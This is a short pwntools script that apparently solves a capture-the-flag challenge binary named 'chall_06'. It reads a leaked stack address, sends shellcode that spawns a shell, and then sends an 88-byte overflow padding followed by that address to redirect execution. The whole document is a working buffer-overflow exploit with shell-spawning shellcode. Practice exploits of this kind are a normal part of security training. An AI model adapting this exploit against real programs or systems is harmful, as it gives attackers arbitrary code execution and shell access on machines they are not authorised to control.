from pwn import *

# Start the process
p = process("./chall_06")

# Receive data until "nt: " 
p.recvuntil(b'nt: ')

# Receive the value stored in the variable var50h
var50h = p.recv()

# Convert the received value to an integer
var50h = int(var50h, 16)

# Set the architecture to amd64
context.arch="amd64"

# Generate shellcode for spawning a shell
shellcode = asm(shellcraft.sh())

# Send the shellcode to execute
p.sendline(shellcode)

# Send the payload to modify var50h
p.sendline(b's'*88+p64(var50h))